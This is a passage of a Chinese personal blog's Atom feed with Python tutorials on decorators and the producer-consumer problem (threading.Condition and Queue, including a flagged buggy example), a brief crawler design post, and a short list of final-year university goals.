<p>这里展示了装饰器最基本的使用，给sum函数添加了debug这个装饰，这个装饰器在sum函数调用之后输出了函数名和返回值方便调试。我们看一下这个语法糖的真面目。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(func)</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args,**kwargs)</span>:</span></div><div class="line">		res=func(*args,**kwargs)</div><div class="line">		<span class="keyword">print</span> <span class="string">"function "</span>+func.__name__+<span class="string">" return "</span>+str(res)</div><div class="line">		<span class="keyword">return</span> res</div><div class="line">	<span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span><span class="params">(a, b)</span>:</span></div><div class="line">	<span class="keyword">return</span> a + b</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">	<span class="keyword">print</span> debug(sum)(<span class="number">1</span>,<span class="number">3</span>)</div><div class="line">	<span class="keyword">print</span> <span class="string">"==== function ===="</span></div><div class="line">	<span class="keyword">print</span> debug</div><div class="line">	<span class="keyword">print</span> debug(sum)</div></pre></td></tr></table></figure></p>
<p>运行结果为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">function sum return 4</div><div class="line">4</div><div class="line">==== function ====</div><div class="line">&lt;function debug at 0x1044c0de8&gt;</div><div class="line">&lt;function wrapper at 0x1044c0ed8&gt;</div></pre></td></tr></table></figure></p>
<p>在有装饰器的时候，调用sum(1,3)相当于调用了debug(sum)(1,3)。我们来分析一下debug(sum)(1,3)这个调用。在Python中，万物皆对象，类是一个对象，方法也是一个对象。例如：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span><span class="params">(a, b)</span>:</span></div><div class="line">	<span class="keyword">return</span> a + b</div></pre></td></tr></table></figure></p>
<p>定义了一个sum方法，同时，sum也是一个对象，它的类型是函数。sum的值是一个入口在某地址的函数。sum(1,2)就是对这个函数的调用。我们回到debug(sum)(1,3)这个函数调用，首先调用了debug这个函数，它的参数是一个函数，我们根据<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(func)</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args,**kwargs)</span>:</span></div><div class="line">		res=func(*args,**kwargs)</div><div class="line">		<span class="keyword">print</span> <span class="string">"function "</span>+func.__name__+<span class="string">" return "</span>+str(res)</div><div class="line">		<span class="keyword">return</span> res</div><div class="line">	<span class="keyword">return</span> wrapper</div></pre></td></tr></table></figure></p>
<p>return wrapper表示这个函数的返回值是一个函数，即debug(sum)(1,3)相当于wrapper(1,3)。wrapper(1,3)即对wrapper函数的调用。这样，把装饰器函数的定义和语法糖背后的代码结合理解，很容易理解装饰器这个概念和@debug这样的语法。</p>
<h3 id="带参数的情况"><a href="#带参数的情况" class="headerlink" title="带参数的情况"></a>带参数的情况</h3><p>装饰器也可以带参数，这里可能比上面稍微复杂一点，如果上面的还有一点疑惑，多看两遍，在看接下来的。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">is_debug=<span class="keyword">True</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(is_debug)</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(func)</span>:</span></div><div class="line">		<span class="function"><span class="keyword">def</span> <span class="title">inner</span><span class="params">(*args,**kwargs)</span>:</span></div><div class="line">			res=func(*args,**kwargs)</div><div class="line">			<span class="keyword">if</span>(is_debug):</div><div class="line">				<span class="keyword">print</span> <span class="string">"function "</span> + func.__name__ + <span class="string">" return "</span> + str(res)</div><div class="line">			<span class="keyword">return</span> res</div><div class="line">		<span class="keyword">return</span> inner</div><div class="line">	<span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="meta">@debug(is_debug)</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span><span class="params">(a, b)</span>:</span></div><div class="line">	<span class="keyword">return</span> a + b</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">	<span class="keyword">print</span> sum(<span class="number">1</span>,<span class="number">3</span>)</div></pre></td></tr></table></figure></p>
<p>在这里，我们定义了一个全局变量is_debug来控制是否输出debug信息，这个值是装饰器的参数。感觉在装饰器定义多层函数，还有不同的参数，完全分不清啊有木有!<br>我们来看与上面等价的调用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">is_debug=<span class="keyword">True</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(is_debug)</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(func)</span>:</span></div><div class="line">		<span class="function"><span class="keyword">def</span> <span class="title">inner</span><span class="params">(*args,**kwargs)</span>:</span></div><div class="line">			res=func(*args,**kwargs)</div><div class="line">			<span class="keyword">if</span>(is_debug):</div><div class="line">				<span class="keyword">print</span> <span class="string">"function "</span> + func.__name__ + <span class="string">" return "</span> + str(res)</div><div class="line">			<span class="keyword">return</span> res</div><div class="line">		<span class="keyword">return</span> inner</div><div class="line">	<span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span><span class="params">(a, b)</span>:</span></div><div class="line">	<span class="keyword">return</span> a + b</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">	<span class="keyword">print</span> debug(is_debug)(sum)(<span class="number">1</span>,<span class="number">3</span>)</div><div class="line">	<span class="keyword">print</span> <span class="string">"==== function ===="</span></div><div class="line">	<span class="keyword">print</span> debug</div><div class="line">	<span class="keyword">print</span> debug(is_debug)</div><div class="line">	<span class="keyword">print</span> debug(is_debug)(sum)</div></pre></td></tr></table></figure></p>
<p>下面是运行结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">function sum return 4</div><div class="line">4</div><div class="line">==== function ====</div><div class="line">&lt;function debug at 0x10b079e60&gt;</div><div class="line">&lt;function wrapper at 0x10b079f50&gt;</div><div class="line">&lt;function inner at 0x10b08e050&gt;</div></pre></td></tr></table></figure></p>
<p>其实，看懂这个调用的方法跟上面是一样的。不再赘述，值得一提的是这里，其实debug(is_debug)返回的这个函数可以认为是另一个没有参数的装饰器，然后整个结构就上面没有参数的情况一样了。这个新的装饰器的参数是函数，即debug(is_debug)(sum)，然后返回一个参数是<em>args,*</em>kwargs的函数，再调用这个函数，参数为1，3。即完成整个调用。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-语法糖&quot;&gt;&lt;a href=&quot;#0x00-语法糖&quot; class=&quot;headerlink&quot; title=&quot;0x00 语法糖&quot;&gt;&lt;/a&gt;0x00 语法糖&lt;/h2&gt;&lt;p&gt;装饰器是Python一个语法糖，装饰器就是在不改变原函数的基础上，在原函数前后执行一些代码，就好像在原函数上增加了一些装饰品一样。这个语法能非常方便给一个函数增加一些功能，例如权限控制，校验一个函数的输入等。&lt;br&gt;
    
    </summary>
    
      <category term="Python" scheme="http://blog.nudtcat.org/categories/Python/"/>
    
    
      <category term="Python" scheme="http://blog.nudtcat.org/tags/Python/"/>
    
      <category term="装饰器" scheme="http://blog.nudtcat.org/tags/%E8%A3%85%E9%A5%B0%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>一个简单的爬虫</title>
    <link href="http://blog.nudtcat.org/Python/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E7%88%AC%E8%99%AB/"/>
    <id>http://blog.nudtcat.org/Python/一个简单的爬虫/</id>
    <published>2016-09-24T03:31:03.000Z</published>
    <updated>2016-09-28T03:12:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-初衷"><a href="#0x01-初衷" class="headerlink" title="0x01 初衷"></a>0x01 初衷</h2><p>最近准备开始写一些通用的自动化工具，以前也写过一些自动化的东西，不过都是用胶水把一些现成的工具粘连起来而已。自己开始写工具并不只是造轮子，我希望把尽自己最大的努力，每一个模块都做到最细致，规则做到最好，所以这个project会持续很长的时间，而且有可能会重构很多次。<br><a id="more"></a></p>
<h2 id="0x02-设计"><a href="#0x02-设计" class="headerlink" title="0x02 设计"></a>0x02 设计</h2><p>这个爬虫的作用是从一个网页作为开始，爬取相关联的网页。需要注意的有几个点，一是从html中获取链接，使用有很多种方法都可以形成链接的效果，获取链接同样有很多解决方案。二是多线程问题，可以使用简单的线程池，重点在于多线程下的同步和互斥的问题。我在<a href="http://blog.nudtcat.org/default/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%9A%84Python%E5%AE%9E%E7%8E%B0/">生产者消费者问题的Python实现</a>中说到过，其实链接队列就是这个模型，解析模块不停生产链接，插入queue，request模块不停从queue中获取链接，然后将html交给解析模块。解决方法可以看这篇文章。三是链接去重问题，最差的时间复杂度是O(n)，如果链接不多，内存足够，时间复杂度可以到O(1)，但是怎么在大数量级的情况下快速判断一个链接是否重复，是一个难题，但是也有现成的解决方案。另一个问题是具体的规则，同一个页面，不同的锚点可以被优化为只爬取一次。</p>
<p>以上的三个问题，每个问题都可以作为单独一个project深入研究下去，但是那就是software engineer的范畴了。</p>
<h2 id="0x03-简单的设计"><a href="#0x03-简单的设计" class="headerlink" title="0x03 简单的设计"></a>0x03 简单的设计</h2><p>我不喜欢啥都不说，虽然talk is cheap，show me the code。但是把要点说出来，更容易让初学者把握。我写了一个简单的实现，见<a href="https://github.com/nudtcat/simple_crawler/" target="_blank" rel="external">我的github</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-初衷&quot;&gt;&lt;a href=&quot;#0x01-初衷&quot; class=&quot;headerlink&quot; title=&quot;0x01 初衷&quot;&gt;&lt;/a&gt;0x01 初衷&lt;/h2&gt;&lt;p&gt;最近准备开始写一些通用的自动化工具，以前也写过一些自动化的东西，不过都是用胶水把一些现成的工具粘连起来而已。自己开始写工具并不只是造轮子，我希望把尽自己最大的努力，每一个模块都做到最细致，规则做到最好，所以这个project会持续很长的时间，而且有可能会重构很多次。&lt;br&gt;
    
    </summary>
    
      <category term="Python" scheme="http://blog.nudtcat.org/categories/Python/"/>
    
    
      <category term="爬虫" scheme="http://blog.nudtcat.org/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>生产者消费者问题的Python实现</title>
    <link href="http://blog.nudtcat.org/Python/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%9A%84Python%E5%AE%9E%E7%8E%B0/"/>
    <id>http://blog.nudtcat.org/Python/生产者消费者问题的Python实现/</id>
    <published>2016-09-24T03:13:48.000Z</published>
    <updated>2016-09-28T03:12:33.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-背景知识"><a href="#0x00-背景知识" class="headerlink" title="0x00 背景知识"></a>0x00 背景知识</h2><p>生产者和消费者是一个常见的问题，它的模型是多个生产者在生产产品，同时多个消费者消费产品，但是仓库容量是有限的，所以当仓库满了生产者需要休眠，而当仓库空了消费者需要唤醒生产者。这里面涉及的问题有互斥和同步。</p>
<h2 id="0x01-一种解决方法"><a href="#0x01-一种解决方法" class="headerlink" title="0x01 一种解决方法"></a>0x01 一种解决方法</h2><p>可以使用锁来负责互斥，使用threading.Condition来做同步。threading的完整用法见<a href="https://docs.python.org/2/library/threading.html" target="_blank" rel="external">官方文档</a>，Condition的完整用法见<a href="https://docs.python.org/2/library/threading.html#condition-objects" target="_blank" rel="external">Condition的描述</a>。简单来说，Condition内置了锁，当调用acquire()方法时，自动上锁，release()释放锁。wait()方法会释放锁后阻塞程序，直到被notify()方法唤醒。Talk is cheap, this is the code.<br><a id="more"></a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line">warehouse = []</div><div class="line">max_num = <span class="number">10</span></div><div class="line">condition = threading.Condition()</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProducerThread</span><span class="params">(threading.Thread)</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">		threading.Thread.__init__(self)</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">			condition.acquire()</div><div class="line">			<span class="keyword">if</span> len(warehouse) == max_num:</div><div class="line">				<span class="keyword">print</span> <span class="string">"Warehouse is full"</span></div><div class="line">				condition.wait()  <span class="comment"># Release the lock</span></div><div class="line">				<span class="keyword">print</span> <span class="string">"Producer is notified by consumer"</span></div><div class="line">			<span class="keyword">else</span>:</div><div class="line">				warehouse.append(<span class="number">1</span>)</div><div class="line">				<span class="keyword">print</span> <span class="string">"Producer is working, NUM: "</span> + str(len(warehouse))</div><div class="line">			condition.notify()</div><div class="line">			condition.release()</div><div class="line">			time.sleep(random.random())</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConsumerThread</span><span class="params">(threading.Thread)</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">		threading.Thread.__init__(self)</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">			condition.acquire()</div><div class="line">			<span class="keyword">if</span> len(warehouse) == <span class="number">0</span>:</div><div class="line">				<span class="keyword">print</span> <span class="string">"Warehouse is empty"</span></div><div class="line">				condition.wait()</div><div class="line">				<span class="keyword">print</span> <span class="string">"Consumer is notified by producer"</span></div><div class="line">			<span class="keyword">else</span>:</div><div class="line">				warehouse.pop()</div><div class="line">				<span class="keyword">print</span> <span class="string">"Consumer is working, NUM: "</span> + str(len(warehouse))</div><div class="line">			condition.notify()</div><div class="line">			condition.release()</div><div class="line">			time.sleep(random.random())</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">	c_list = []</div><div class="line">	p_list = []</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">		p = ProducerThread()</div><div class="line">		p_list.append(p)</div><div class="line">		p.start()</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</div><div class="line">		c = ConsumerThread()</div><div class="line">		c_list.append(c)</div><div class="line">		c.start()</div></pre></td></tr></table></figure></p>
<p>常见的错误❌代码如下，这是来自网上关于这个知识点的示例，真是天下代码一大抄啊。至于错误原因，读者不难发现。下面的代码会超过仓库的最大存储。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread, Condition</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line">queue = []</div><div class="line">MAX_NUM = <span class="number">10</span></div><div class="line">condition = Condition()</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProducerThread</span><span class="params">(Thread)</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">		nums = range(<span class="number">5</span>)</div><div class="line">		<span class="keyword">global</span> queue</div><div class="line">		<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">			condition.acquire()</div><div class="line">			<span class="keyword">if</span> len(queue) == MAX_NUM:</div><div class="line">				<span class="keyword">print</span> <span class="string">"Queue full, producer is waiting"</span></div><div class="line">				condition.wait()</div><div class="line">				<span class="keyword">print</span> <span class="string">"Space in queue, Consumer notified the producer"</span></div><div class="line">			num = random.choice(nums)</div><div class="line">			queue.append(num)</div><div class="line">			<span class="keyword">print</span> <span class="string">"Produced"</span>, len(queue)</div><div class="line">			condition.notify()</div><div class="line">			condition.release()</div><div class="line">			time.sleep(random.random())</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConsumerThread</span><span class="params">(Thread)</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="keyword">global</span> queue</div><div class="line">		<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">			condition.acquire()</div><div class="line">			<span class="keyword">if</span> <span class="keyword">not</span> queue:</div><div class="line">				<span class="keyword">print</span> <span class="string">"Nothing in queue, consumer is waiting"</span></div><div class="line">				condition.wait()</div><div class="line">				<span class="keyword">print</span> <span class="string">"Producer added something to queue and notified the consumer"</span></div><div class="line">			num = queue.pop(<span class="number">0</span>)</div><div class="line">			<span class="keyword">print</span> <span class="string">"Consumed"</span>, len(queue)</div><div class="line">			condition.notify()</div><div class="line">			condition.release()</div><div class="line">			time.sleep(random.random())</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">	c_list = []</div><div class="line">	p_list = []</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">		p = ProducerThread()</div><div class="line">		p_list.append(p)</div><div class="line">		p.start()</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</div><div class="line">		c = ConsumerThread()</div><div class="line">		c_list.append(c)</div><div class="line">		c.start()</div></pre></td></tr></table></figure></p>
<h2 id="0x02-基于Queue的实现"><a href="#0x02-基于Queue的实现" class="headerlink" title="0x02 基于Queue的实现"></a>0x02 基于Queue的实现</h2><p>Queue模块内置了Condition，可以使用Queue同时满足互斥和同步两个要求。Queue本来就是线程安全的，而Queue的task_done()方法可以用来同步。Queue的详细使用见<a href="https://docs.python.org/2/library/queue.html" target="_blank" rel="external">官方文档</a>。这个实现代码如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> Queue</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line">product_queue = Queue.Queue(<span class="number">10</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProducerThread</span><span class="params">(threading.Thread)</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">		threading.Thread.__init__(self)</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">			product_queue.put(<span class="number">1</span>, block=<span class="keyword">True</span>)</div><div class="line">			time.sleep(random.random())</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConsumerThread</span><span class="params">(threading.Thread)</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">		threading.Thread.__init__(self)</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">			product_queue.get(block=<span class="keyword">True</span>)</div><div class="line">			product_queue.task_done()</div><div class="line">			time.sleep(random.random())</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">	c_list = []</div><div class="line">	p_list = []</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">		p = ProducerThread()</div><div class="line">		p_list.append(p)</div><div class="line">		p.start()</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">		c = ConsumerThread()</div><div class="line">		c_list.append(c)</div><div class="line">		c.start()</div></pre></td></tr></table></figure></p>
<p>Queue也是用Condition来实现的，注意:</p>
<blockquote>
<p>Note: the notify() and notifyAll() methods don’t release the lock; this means that the thread or threads awakened will not return from their wait() call immediately, but only when the thread that called notify() or notifyAll() finally relinquishes ownership of the lock.</p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-背景知识&quot;&gt;&lt;a href=&quot;#0x00-背景知识&quot; class=&quot;headerlink&quot; title=&quot;0x00 背景知识&quot;&gt;&lt;/a&gt;0x00 背景知识&lt;/h2&gt;&lt;p&gt;生产者和消费者是一个常见的问题，它的模型是多个生产者在生产产品，同时多个消费者消费产品，但是仓库容量是有限的，所以当仓库满了生产者需要休眠，而当仓库空了消费者需要唤醒生产者。这里面涉及的问题有互斥和同步。&lt;/p&gt;
&lt;h2 id=&quot;0x01-一种解决方法&quot;&gt;&lt;a href=&quot;#0x01-一种解决方法&quot; class=&quot;headerlink&quot; title=&quot;0x01 一种解决方法&quot;&gt;&lt;/a&gt;0x01 一种解决方法&lt;/h2&gt;&lt;p&gt;可以使用锁来负责互斥，使用threading.Condition来做同步。threading的完整用法见&lt;a href=&quot;https://docs.python.org/2/library/threading.html&quot;&gt;官方文档&lt;/a&gt;，Condition的完整用法见&lt;a href=&quot;https://docs.python.org/2/library/threading.html#condition-objects&quot;&gt;Condition的描述&lt;/a&gt;。简单来说，Condition内置了锁，当调用acquire()方法时，自动上锁，release()释放锁。wait()方法会释放锁后阻塞程序，直到被notify()方法唤醒。Talk is cheap, this is the code.&lt;br&gt;
    
    </summary>
    
      <category term="Python" scheme="http://blog.nudtcat.org/categories/Python/"/>
    
    
      <category term="Python" scheme="http://blog.nudtcat.org/tags/Python/"/>
    
      <category term="操作系统" scheme="http://blog.nudtcat.org/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>珍惜大学仅剩的一年</title>
    <link href="http://blog.nudtcat.org/Chat/%E7%8F%8D%E6%83%9C%E5%A4%A7%E5%AD%A6%E4%BB%85%E5%89%A9%E7%9A%84%E4%B8%80%E5%B9%B4/"/>
    <id>http://blog.nudtcat.org/Chat/珍惜大学仅剩的一年/</id>
    <published>2016-09-23T14:15:59.000Z</published>
    <updated>2016-09-28T03:12:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>珍惜最后一年的大学生活</p>
<ul>
<li>写一篇优秀的毕业论文</li>
<li>在大雨天跑一次步</li>
<li>感受教学楼，图书馆，读几本书</li>
<li>毕业旅行</li>
<li>来一次冒险(骑行||徒步)<a id="more"></a>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;珍惜最后一年的大学生活&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;写一篇优秀的毕业论文&lt;/li&gt;
&lt;li&gt;在大雨天跑一次步&lt;/li&gt;
&lt;li&gt;感受教学楼，图书馆，读几本书&lt;/li&gt;
&lt;li&gt;毕业旅行&lt;/li&gt;
&lt;li&gt;来一次冒险(骑行||徒步)
    
    </summary>
    
      <category term="杂谈" scheme="http://blog.nudtcat.org/categories/Chat/"/>
    
    
      <category term="大学生活" scheme="http://blog.nudtcat.org/tags/%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
</feed>
